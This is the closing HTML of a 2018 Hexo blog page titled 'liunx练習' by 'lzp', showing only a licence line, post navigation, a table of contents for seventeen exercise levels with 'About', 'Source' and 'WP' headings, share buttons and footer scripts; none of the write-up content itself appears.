            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/11/28/liunx练习/　　作者: lzp" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2018/11/28/我要抄什么/">
                    我要抄什么
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#level00"><span class="toc-number">1.</span> <span class="toc-text">level00</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About"><span class="toc-number">1.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP"><span class="toc-number">1.2.</span> <span class="toc-text">WP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level01"><span class="toc-number">2.</span> <span class="toc-text">level01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-1"><span class="toc-number">2.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source"><span class="toc-number">2.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-1"><span class="toc-number">2.3.</span> <span class="toc-text">WP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level02"><span class="toc-number">3.</span> <span class="toc-text">level02</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-2"><span class="toc-number">3.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-1"><span class="toc-number">3.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-2"><span class="toc-number">3.3.</span> <span class="toc-text">WP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level03"><span class="toc-number">4.</span> <span class="toc-text">level03</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-3"><span class="toc-number">4.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-3"><span class="toc-number">4.2.</span> <span class="toc-text">WP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level04"><span class="toc-number">5.</span> <span class="toc-text">level04</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-4"><span class="toc-number">5.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-2"><span class="toc-number">5.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-4"><span class="toc-number">5.3.</span> <span class="toc-text">WP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level05"><span class="toc-number">6.</span> <span class="toc-text">level05</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-5"><span class="toc-number">6.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-5"><span class="toc-number">6.2.</span> <span class="toc-text">WP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level06"><span class="toc-number">7.</span> <span class="toc-text">level06</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-6"><span class="toc-number">7.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-6"><span class="toc-number">7.2.</span> <span class="toc-text">WP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level07"><span class="toc-number">8.</span> <span class="toc-text">level07</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-7"><span class="toc-number">8.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-3"><span class="toc-number">8.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-7"><span class="toc-number">8.3.</span> <span class="toc-text">WP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level08"><span class="toc-number">9.</span> <span class="toc-text">level08</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-8"><span class="toc-number">9.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-8"><span class="toc-number">9.2.</span> <span class="toc-text">WP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level09"><span class="toc-number">10.</span> <span class="toc-text">level09</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-9"><span class="toc-number">10.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-4"><span class="toc-number">10.2.</span> <span class="toc-text">Source</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level10"><span class="toc-number">11.</span> <span class="toc-text">level10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-10"><span class="toc-number">11.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-5"><span class="toc-number">11.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-9"><span class="toc-number">11.3.</span> <span class="toc-text">WP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level11"><span class="toc-number">12.</span> <span class="toc-text">level11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-11"><span class="toc-number">12.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-6"><span class="toc-number">12.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-10"><span class="toc-number">12.3.</span> <span class="toc-text">WP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WP1"><span class="toc-number">12.3.1.</span> <span class="toc-text">WP1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WP2"><span class="toc-number">12.3.2.</span> <span class="toc-text">WP2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WP3"><span class="toc-number">12.3.3.</span> <span class="toc-text">WP3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level12"><span class="toc-number">13.</span> <span class="toc-text">level12</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-12"><span class="toc-number">13.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-7"><span class="toc-number">13.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-11"><span class="toc-number">13.3.</span> <span class="toc-text">WP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level13"><span class="toc-number">14.</span> <span class="toc-text">level13</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-13"><span class="toc-number">14.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-8"><span class="toc-number">14.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-12"><span class="toc-number">14.3.</span> <span class="toc-text">WP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WP1-1"><span class="toc-number">14.3.1.</span> <span class="toc-text">WP1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WP2-1"><span class="toc-number">14.3.2.</span> <span class="toc-text">WP2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level14"><span class="toc-number">15.</span> <span class="toc-text">level14</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-14"><span class="toc-number">15.1.</span> <span class="toc-text">About</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level15"><span class="toc-number">16.</span> <span class="toc-text">level15</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-15"><span class="toc-number">16.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-13"><span class="toc-number">16.2.</span> <span class="toc-text">WP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level16"><span class="toc-number">17.</span> <span class="toc-text">level16</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-16"><span class="toc-number">17.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-9"><span class="toc-number">17.2.</span> <span class="toc-text">Source</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level17"><span class="toc-number">18.</span> <span class="toc-text">level17</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#About-17"><span class="toc-number">18.1.</span> <span class="toc-text">About</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-10"><span class="toc-number">18.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-14"><span class="toc-number">18.3.</span> <span class="toc-text">WP</span></a></li></ol></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>



    
<div class="share">
    
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"liunx练习　| lzp's blogs　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    

    
</div>







    




    <div class="scroll" id="post-nav-button">
        
            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2018/11/28/我要抄什么/" title="下一篇: 我要抄什么">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/11/28/liunx练习/">liunx练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/28/我要抄什么/">我要抄什么</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2018 lzp
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style="display:none">
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style="display:none">
                        <span id="page-visit" title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 5;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>